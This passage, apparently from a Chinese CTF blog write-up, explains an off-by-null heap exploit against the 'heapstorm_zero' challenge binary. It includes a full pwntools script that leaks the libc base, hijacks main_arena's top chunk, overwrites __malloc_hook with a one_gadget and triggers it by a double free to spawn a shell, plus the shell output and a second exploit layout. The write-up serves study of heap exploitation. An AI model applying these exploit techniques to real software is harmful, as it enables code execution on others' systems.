# 3</span><br><span class="line">add(0x18, &apos;a&apos;)  # 9</span><br><span class="line">add(0x38, &apos;1&apos; * 0x30)  # 10</span><br><span class="line">add(0x38, &apos;2&apos; * 0x30)  # 11</span><br><span class="line">add(0x28, &apos;3&apos; * 0x30)  # 12</span><br><span class="line">add(0x38, &apos;4&apos; * 0x30)  # 13</span><br><span class="line">add(0x38, &apos;5&apos; * 0x30)  # 14</span><br><span class="line">pay = &apos;a&apos; * 0x20 + p64(0x200) + p64(0x20)</span><br><span class="line">add(0x38, pay)  # 15</span><br><span class="line"></span><br><span class="line">add(0x38, &apos;end&apos;)  # 16</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(1)</span><br><span class="line">dele(2)</span><br><span class="line">dele(3)</span><br><span class="line">for i in range(9, 16):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line">triger_consolidate()</span><br></pre></td></tr></table></figure></p><p>此时的内存状态如图</p><p><img alt="" data-src="/imgs/off-by-null-4.png" class="lozad"></p><p>此时 chunk 4 - chunk 8 落入了新构造的 smallbin 里面。下面通过 不断的分配，会对这个 smallbin 进行切割，这个过程就会使得 一些链表用的指针落入到 还处于 使用状态的 chunk4 - chunk8 的某一个 chunk 里面， 然后利用 puts 功能，就可以打印指针的内容，造成信息泄露， 拿到 libc 的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">### 构造好 unsorted bin ，下面通过不断切割，让指针落入 overlap chunk 里面， 然后 Puts leak 出来</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">pay = <span class="string">'a'</span> * <span class="number">0x38</span></span><br><span class="line">add(<span class="number">0x38</span>, pay)  <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###  再次 shrink chunk 利用切割smallbin遗留下的指针，leak libc</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span> * <span class="number">8</span>)  <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'b'</span> * <span class="number">8</span>)  <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'c'</span> * <span class="number">8</span>)  <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">view(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">lbase = u64(p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x3c4b20</span> - <span class="number">88</span></span><br><span class="line">success(<span class="string">'lbase: '</span> + hex(lbase))</span><br></pre></td></tr></table></figure><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>能够 overlap chunk 后实现 getshell 的方式就很多了，下面 分析下 exp 的 getshell 方案。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># fastbin dup, 利用 overlap chunk 和 fastbin 的机制往  main_arena 写 size 0x41</span></span><br><span class="line"><span class="comment"># 然后利用 fastbin attack 控制 main_arena-&gt;top.</span></span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line">dele(<span class="number">14</span>)</span><br><span class="line">dele(<span class="number">0xc</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">dele(<span class="number">15</span>)</span><br><span class="line">dele(<span class="number">0xd</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改fastbin的fd为0x41,然后分配几次，让main_arean里面有0x41</span></span><br><span class="line">add(<span class="number">0x28</span>, p64(<span class="number">0x41</span>))</span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>, p64(lbase + <span class="number">0x3c4b20</span> + <span class="number">8</span>))</span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span>)</span><br><span class="line"><span class="comment"># 利用之前在main_arean里面设置的0x41作为size分配到main_arean,然后修改top_chunk的地址为__malloc_hook-0x18</span></span><br><span class="line">add(<span class="number">0x38</span>, p64(lbase + <span class="number">0x3c4b20</span> + <span class="number">8</span> + <span class="number">0x20</span>) + <span class="string">'\x00'</span> * <span class="number">0x10</span> + p64(<span class="number">0x41</span>))</span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'\x00'</span> * <span class="number">0x20</span> + p64(lbase + libc.sym[<span class="string">'__malloc_hook'</span>] - <span class="number">0x18</span>))</span><br></pre></td></tr></table></figure><ul><li>利用 overlap chunk 和 fastbin 的机制往 main_arena 写 size (0x41)</li><li>然后利用 fastbin attack 控制 main_arena-&gt;top<br>然后就可以分配到 malloc_hook 附近，修改 malloc_hook 为 one_gadget.</li></ul><p>最后利用 malloc_printerr 触发 one_gadget<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 此时 chunk 6 和 chunk 8 在 tbl 的指针一样，触发 double free</span></span><br><span class="line"><span class="comment"># malloc_printerr ---&gt; malloc_hook ---&gt; getshell</span></span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">dele(<span class="number">8</span>)</span><br></pre></td></tr></table></figure></p><p>完整exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">from time import sleep</span><br><span class="line">from utils import *</span><br><span class="line"></span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">context.terminal = [&apos;tmux&apos;, &apos;splitw&apos;, &apos;-h&apos;]</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;splitw&apos;, &apos;-v&apos;]</span><br><span class="line"></span><br><span class="line">path = &quot;./heapstorm_zero&quot;</span><br><span class="line"></span><br><span class="line">p = process(path, aslr=0)</span><br><span class="line">bin = ELF(path, checksec=False)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc-2.23.so&apos;, checksec=False)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># result = (unsigned int)(a1 - 1) &lt;= 0x37;</span><br><span class="line">def add(size, con):</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    p.sendline(&apos;1&apos;)</span><br><span class="line">    p.recvuntil(&apos;size:&apos;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(&apos;content:&apos;)</span><br><span class="line">    p.sendline(con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def view(idx):</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    p.sendline(&apos;2&apos;)</span><br><span class="line">    p.recvuntil(&apos;index:&apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    p.sendline(&apos;3&apos;)</span><br><span class="line">    p.recvuntil(&apos;index:&apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def triger_consolidate(pay=&apos;&apos;):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    利用 scanf(&quot;%d&quot;,&amp;n) 触发大内存分配，进而导致 内存合并。</span><br><span class="line">    :param pay:</span><br><span class="line">    :return:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    if pay == &apos;&apos;:</span><br><span class="line">        p.sendline(&apos;1&apos; * 0x400)  # malloc_consolidate</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x38, &apos;a&apos;)  # 0</span><br><span class="line"></span><br><span class="line">add(0x28, &apos;a&apos;)  # 1</span><br><span class="line">add(0x28, &apos;a&apos;)  # 2</span><br><span class="line">add(0x18, &apos;a&apos;)  # 3</span><br><span class="line">add(0x18, &apos;a&apos;)  # 4</span><br><span class="line">add(0x38, &apos;x&apos;)  # 5</span><br><span class="line">add(0x28, &apos;x&apos;)  # 6</span><br><span class="line">add(0x38, &apos;x&apos;)  # 7</span><br><span class="line">add(0x38, &apos;x&apos;)  # 8</span><br><span class="line">add(0x38, &apos;x&apos;)  # 9</span><br><span class="line">pay = &apos;a&apos; * 0x20 + p64(0x200) + p64(0x20)  # shrink chunk 前，配置好</span><br><span class="line">add(0x38, pay)  # 10</span><br><span class="line"></span><br><span class="line">add(0x38, &apos;end&apos;)  # 11  , 保留块， 防止和 top chunk 合并</span><br><span class="line"></span><br><span class="line"># 释放掉 chunk</span><br><span class="line">for i in range(1, 11):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line"># 利用 scanf 分配大内存 0x400+ , 会触发堆合并</span><br><span class="line"># fastbin 会合并进入 smallbin</span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span class="line"># 合并后 形成 0x210 大小的 smallbin</span><br><span class="line"># pwndbg&gt; x/4xg 0x555555757040</span><br><span class="line"># 0x555555757040: 0x0000000000000000      0x0000000000000211</span><br><span class="line"># 0x555555757050: 0x00002aaaab097d78      0x00002aaaab097d78</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 利用 chunk 0 , 溢出 一字节的 \x00 , 修改 size ---&gt; 0x200</span><br><span class="line">dele(0)</span><br><span class="line">pay = &apos;a&apos; * 0x38</span><br><span class="line">add(0x38, pay)  # 0</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">add(0x38, &apos;a&apos; * 8)  # 1</span><br><span class="line">add(0x38, &apos;b&apos; * 8)  # 2</span><br><span class="line">add(0x38, &apos;c&apos; * 8)  # 3</span><br><span class="line">add(0x38, &apos;x&apos;)  # 4</span><br><span class="line">add(0x38, &apos;x&apos;)  # 5</span><br><span class="line">add(0x28, &apos;x&apos;)  # 6</span><br><span class="line">add(0x38, &apos;x&apos;)  # 7</span><br><span class="line">add(0x38, &apos;x&apos;)  # 8</span><br><span class="line"></span><br><span class="line"># 利用 大量的 fastbin + 堆合并 构造 smallbin , 大小 0xc0</span><br><span class="line">dele(1)</span><br><span class="line">dele(2)</span><br><span class="line">dele(3)</span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span class="line"># 触发 overlap</span><br><span class="line">dele(11)</span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span class="line">add(0x28, &apos;a&apos;)  # 1</span><br><span class="line">add(0x28, &apos;a&apos;)  # 2</span><br><span class="line">add(0x18, &apos;a&apos;)  # 3</span><br><span class="line">add(0x18, &apos;a&apos;)  # 9</span><br><span class="line">add(0x38, &apos;1&apos; * 0x30)  # 10</span><br><span class="line">add(0x38, &apos;2&apos; * 0x30)  # 11</span><br><span class="line">add(0x28, &apos;3&apos; * 0x30)  # 12</span><br><span class="line">add(0x38, &apos;4&apos; * 0x30)  # 13</span><br><span class="line">add(0x38, &apos;5&apos; * 0x30)  # 14</span><br><span class="line">pay = &apos;a&apos; * 0x20 + p64(0x200) + p64(0x20)</span><br><span class="line">add(0x38, pay)  # 15</span><br><span class="line"></span><br><span class="line">add(0x38, &apos;end&apos;)  # 16</span><br><span class="line"></span><br><span class="line"># 此时会有 指针交叉</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(1)</span><br><span class="line">dele(2)</span><br><span class="line">dele(3)</span><br><span class="line">for i in range(9, 16):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span class="line">### 构造好 unsorted bin ，下面通过不断切割，让指针落入 overlap chunk 里面， 然后 Puts leak 出来</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(0)</span><br><span class="line">pay = &apos;a&apos; * 0x38</span><br><span class="line">add(0x38, pay)  # 0</span><br><span class="line"></span><br><span class="line">###  再次 shrink chunk</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x38, &apos;a&apos; * 8)  # 1</span><br><span class="line">add(0x38, &apos;b&apos; * 8)  # 2</span><br><span class="line">add(0x38, &apos;c&apos; * 8)  # 3</span><br><span class="line"></span><br><span class="line">view(4)</span><br><span class="line">p.recvuntil(&apos;Content: &apos;)</span><br><span class="line">lbase = u64(p.recvuntil(&apos;\n&apos;)[:-1].ljust(8, &apos;\x00&apos;)) - 0x3c4b20 - 88</span><br><span class="line">success(&apos;lbase: &apos; + hex(lbase))</span><br><span class="line"></span><br><span class="line">dele(1)</span><br><span class="line">dele(2)</span><br><span class="line">dele(3)</span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span class="line">### 让 heap 回到 shrink chunk 后的情况</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">32: 0x0</span><br><span class="line">48: 0x0</span><br><span class="line">64: 0x0</span><br><span class="line">80: 0x0</span><br><span class="line">96: 0x0</span><br><span class="line">112: 0x0</span><br><span class="line">128: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">512: 0x603040 —▸ 0x2aaaab097d68 (main_arena+584) ◂— 0x603040 /* u&apos;@0`&apos; */</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/4xg 0x603040</span><br><span class="line">0x603040:       0x6161616161616161      0x0000000000000201</span><br><span class="line">0x603050:       0x00002aaaab097d68      0x00002aaaab097d68</span><br><span class="line">pwndbg&gt;</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">add(0x18, &apos;A&apos; * 0x10)  # 1</span><br><span class="line">add(0x28, &apos;B&apos; * 0x20)  # 2</span><br><span class="line">add(0x38, &apos;C&apos; * 0x30)  # 3</span><br><span class="line">add(0x18, &apos;D&apos; * 0x10)  # 9</span><br><span class="line"></span><br><span class="line">pay = p64(0) + p64(0x41)</span><br><span class="line">add(0x18, pay)  # 6</span><br><span class="line">add(0x28, &apos;asd&apos;)</span><br><span class="line">add(0x38, &apos;zxc&apos;)  # 5,c</span><br><span class="line">add(0x28, &apos;qqq&apos;)  # 6,d</span><br><span class="line"></span><br><span class="line">add(0x38, &apos;a1&apos;)  # 14</span><br><span class="line">add(0x28, &apos;a2&apos;)  # 15</span><br><span class="line"></span><br><span class="line"># fastbin dup, 利用 overlap chunk 和 fastbin 的机制往  main_arena 写 size 0x41</span><br><span class="line"># 然后利用 fastbin attack 控制 main_arena-&gt;top.</span><br><span class="line">dele(5)</span><br><span class="line">dele(14)</span><br><span class="line">dele(0xc)</span><br><span class="line"></span><br><span class="line">dele(6)</span><br><span class="line">dele(15)</span><br><span class="line">dele(0xd)</span><br><span class="line"></span><br><span class="line">add(0x28, p64(0x41))</span><br><span class="line">add(0x28, &apos;a&apos;)</span><br><span class="line">add(0x28, &apos;a&apos;)</span><br><span class="line"></span><br><span class="line">add(0x38, p64(lbase + 0x3c4b20 + 8))</span><br><span class="line">add(0x38, &apos;a&apos;)</span><br><span class="line">add(0x38, &apos;a&apos;)</span><br><span class="line">add(0x38, p64(lbase + 0x3c4b20 + 8 + 0x20) + &apos;\x00&apos; * 0x10 + p64(0x41))</span><br><span class="line">add(0x38, &apos;\x00&apos; * 0x20 + p64(lbase + libc.sym[&apos;__malloc_hook&apos;] - 0x18))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 把 unsorted bin 分配掉</span><br><span class="line">add(0x18, &apos;a&apos; * 0x18)</span><br><span class="line"></span><br><span class="line"># 使用 top_chunk 分配，此时 top_chunk 位于 malloc_hook 上方， 修改 malloc_hook</span><br><span class="line">add(0x18, p64(lbase + 0xf02a4) * 2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># gdb.attach(p)</span><br><span class="line"># pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 此时 chunk 6 和 chunk 8 在 tbl 的指针一样，触发 double free</span><br><span class="line"># malloc_printerr ---&gt; malloc_hook ---&gt; getshell</span><br><span class="line">dele(6)</span><br><span class="line">dele(8)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line"> [DEBUG] Received 0x5b bytes:</span><br><span class="line">    &quot;*** Error in `heapstrom_zero&apos;: double free or corruption (fasttop): 0x0000000000603200 ***\n&quot;</span><br><span class="line">*** Error in `heapstrom_zero&apos;: double free or corruption (fasttop): 0x0000000000603200 ***</span><br><span class="line">$ id</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;id\n&apos;</span><br><span class="line">[DEBUG] Received 0x84 bytes:</span><br><span class="line">    00000000  75 69 64 3d  31 30 30 30  28 6a 69 6e  67 29 20 67  │uid=│1000│(jin│g) g│</span><br><span class="line">    00000010  69 64 3d 31  30 30 30 28  6a 69 6e 67  29 20 e7 bb  │id=1│000(│jing│) ··│</span><br><span class="line">    00000020  84 3d 31 30  30 30 28 6a  69 6e 67 29  2c 34 28 61  │·=10│00(j│ing)│,4(a│</span><br><span class="line">    00000030  64 6d 29 2c  32 34 28 63  64 72 6f 6d  29 2c 32 37  │dm),│24(c│drom│),27│</span><br><span class="line">    00000040  28 73 75 64  6f 29 2c 33  30 28 64 69  70 29 2c 34  │(sud│o),3│0(di│p),4│</span><br><span class="line">    00000050  36 28 70 6c  75 67 64 65  76 29 2c 31  31 33 28 6c  │6(pl│ugde│v),1│13(l│</span><br><span class="line">    00000060  70 61 64 6d  69 6e 29 2c  31 32 38 28  73 61 6d 62  │padm│in),│128(│samb│</span><br><span class="line">    00000070  61 73 68 61  72 65 29 2c  39 39 39 28  64 6f 63 6b  │asha│re),│999(│dock│</span><br><span class="line">    00000080  65 72 29 0a                                         │er)·││</span><br><span class="line">    00000084</span><br><span class="line">uid=1000(jing) gid=1000(jing) 组=1000(jing),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),999(docker)</span><br></pre></td></tr></table></figure><h2 id="另一种布局"><a href="#另一种布局" class="headerlink" title="另一种布局"></a>另一种布局</h2><p>为进一步理解 off by null , 下面以另一个 exp 的信息泄露过程为例介绍下堆的布局</p><p>来源 <a href="https://xz.aliyun.com/t/3253#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/3253#toc-2</a><br>首先分配若干个 chunk , 释放掉其中的第一个 chunk ，利用 scanf 触发堆合并构造 smallbin<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"AAA\n"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">    add(<span class="number">0x38</span>, <span class="string">"A"</span> * <span class="number">8</span> + str(i) + <span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 触发堆合并， 构造 2 个 ， smallbin</span></span><br><span class="line">sla(<span class="string">"Choice:"</span>, <span class="string">"1"</span> * <span class="number">0x500</span>)</span><br></pre></td></tr></table></figure></p><p>此时 chunk 10 的 pre_size 为 0x180 , pre_inused = 0.</p><p><img alt="" data-src="/imgs/off-by-null-5.png" class="lozad"><br>图中颜色定义如下<br><img alt="" data-src="/imgs/off-by-null-6.png" class="lozad"></p><p>然后分配一个 0x40 的 chunk , 此时会用 0x180 大小的 smallbin 分配，分配后应该剩下 0x140 大小的 unsorted bin (bin 切割后会保存在 unsorted bin ) , 然后利用 off by null , 修改 unsorted bin 的大小为 0x100. 此时会出现 0x40 的空隙。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 分配比较大的内存，使用较大的 smallbin , 分配完后利用 off by null</span></span><br><span class="line"><span class="comment"># shrink unsorted bin 的大小</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"B"</span> * <span class="number">0x30</span> + p64(<span class="number">0x120</span>))</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/imgs/off-by-null-7.png" class="lozad"></p><p>下面在分配两个 chunk (4 5) , 然后释放 chunk 4 , 在利用 堆合并 将 fastbin 放入 smallbin</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 构造 smallbin 为 合并时的 unlink 做准备</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"C"</span> * <span class="number">0x30</span> + p32(<span class="number">0x40</span>) + <span class="string">'\n'</span>)  <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"P"</span> * <span class="number">0x30</span> + <span class="string">'\n'</span>)  <span class="comment"># 5</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># 触发堆合并，形成 smallbin</span></span><br><span class="line">sla(<span class="string">"Choice:"</span>, <span class="string">"1"</span> * <span class="number">0x500</span>)</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/imgs/off-by-null-8.png" class="lozad"></p><p>然后把 chunk 10 释放掉， 此时系统根据 chunk 10 的 pre_size 找到 smallbin 的位置进行合并， 由于 smallbin 此时已经在链表中，所以可以成功完成合并过程中的 unlink 操作， 然后会得到一个很大的 smallbin</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 释放 chunk 10, 同时触发堆合并，形成 overlap chunk , 测试 chunk 5 被 overlap</span></span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">sla(<span class="string">"Choice:"</span>, <span class="string">"1"</span> * <span class="number">0x500</span>)</span><br></pre></td></tr></table></figure><p>此时的内存布局如下图<br><img alt="" data-src="/imgs/off-by-null-9.png" class="lozad"></p><p>通过合并我们得到了一个 0x180 大小的 smallbin , 在这个大 smallbin 里面有一个还在使用的 chunk 5 , 同时还有之前分配剩下的 